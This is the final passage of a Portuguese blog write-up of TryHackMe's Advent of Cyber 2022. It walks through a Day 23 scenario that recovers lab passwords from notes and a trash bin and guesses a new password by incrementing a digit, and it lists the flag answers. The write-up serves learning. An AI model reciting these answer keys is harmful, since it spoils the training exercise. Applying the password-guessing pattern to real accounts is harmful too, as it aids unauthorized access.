<p>O terceiro caso é o mais complicado de todos, já que foram adotadas certas medidas de defesa em profundidade pela equipe do Papai Noel. Para passar pelo guarda ainda é que nem no caso anterior. Novamente no Post-it do assistente encontramos que a comida favorita dele é <strong>3XtrR@_S3cr3tV@ultPW</strong>. E na primeira gaveta desse escritório podemos pegar o crachá do Papai Noel, que nos permitirá acessar mais áreas.</p>
<p><img loading="lazy" src="/images/aoc2022/23.6.png" alt="Comida Favorita Assistente"  />
</p>
<p>A senha do notebook do assistente é a comida favorita dele. Ao logar no notebook encontramos um arquivo de texto e uma lixeira. No arquivo de texto encontramos a segunda metade da senha do cofre, <strong>Pr0v3dV@ultPW</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.7.png" alt="Parte 2 da Senha do Cofre 3"  />
</p>
<p>E na lixeira encontramos a senha antiga do notebook do Papai Noel, <strong>H0tCh0coL@t3_01</strong>. Mas como ele é preguiçoso a nova senha é apenas incrementar o último dígito da antiga, <strong>H0tCh0coL@t3_02</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.8.png" alt="Senha Antiga Notebook Papai Noel"  />
</p>
<p>Tendo acessado o notebook dele com a senha nova, encontramos a primeira metade da senha do cofre, <strong>N3w4nd1m</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.9.png" alt="Parte 1 da Senha do Cofre 3"  />
</p>
<p>Dessa forma para criar a senha completa do cofre é só concatenar as duas, assim ficando <strong>N3w4nd1mPr0v3dV@ultPW</strong>. No cofre encontramos a terceira flag e o pin de acesso à Oficina do Papai Noel, respectivamente <strong>THM{B@d_Y3t1_1s_n@u6hty}</strong> e <strong>2845</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.10.png" alt="Flag 3 e Pin da Oficina"  />
</p>
<p>Por fim podemos acessar a oficina e conseguir a flag final, <strong>THM{D3f3n5e_1n_D3pth_1s_k00L!!}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/23.11.png" alt="Flag Final"  />
</p>
<h2 id="day-24-ho-ho-ho-the-surveys-short--the-year-of-the-bandit-yeti">[Day 24] Ho, ho, ho, the survey&rsquo;s short / The Year of the Bandit Yeti</h2>
<p>O último dia não tem nenhum conteúdo novo e é dividido em duas Tasks. A primeira é para fornecer um feedback sobre como foi o evento e o que você achou. Enquanto a segunda é para contar o final da história.</p>
<p>Na Task 29, para conseguir a flag é só fazer o formulário de feedback que será dado a flag <strong>THM{AoC2022!thank_you!}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/24.1.png" alt="Feedback flag"  />
</p>
<p>Enquanto na Task 30, a única questão que tem é para responder <strong>Yea</strong>.</p>
<h2 id="conclusão">Conclusão</h2>
<p>Após responder todas as questões e ter 100% da sala concluída ganhamos o certificado de conclusão e uma badge do evento.</p>
<p><img loading="lazy" src="/images/aoc2022/0.4.png" alt="Certificado"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/0.5.png" alt="Badge"  />
</p>
<p>Assim terminamos o Advent of Cyber do TryHackMe. Os conteúdos apresentados durante o evento foram de certa forma introdutórios voltados para pessoas que estão começando na área, e podem ser mais aprofundados a partir de outras salas do TryHackMe ou em outros materiais.</p>
<p>Espero que esse meu Write-Up possa ter ajudado quem esteja em dúvida sobre algum dos desafios. Agradeço a todos que leram. Qualquer dúvida ou sugestão de melhoria é só entrar em contato comigo.</p>
<hr>
<p><img loading="lazy" src="/images/aoc2022/0.3.png" alt="lukewicz"  />
</p>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      tags:
      <li><a href="https://tomiodarim.io/tags/write-up/">write-up</a></li>
      <li><a href="https://tomiodarim.io/tags/tryhackme/">tryhackme</a></li>
      <li><a href="https://tomiodarim.io/tags/aoc2022/">aoc2022</a></li>
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>Lucas Tomio Darim · &copy; 2024</span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
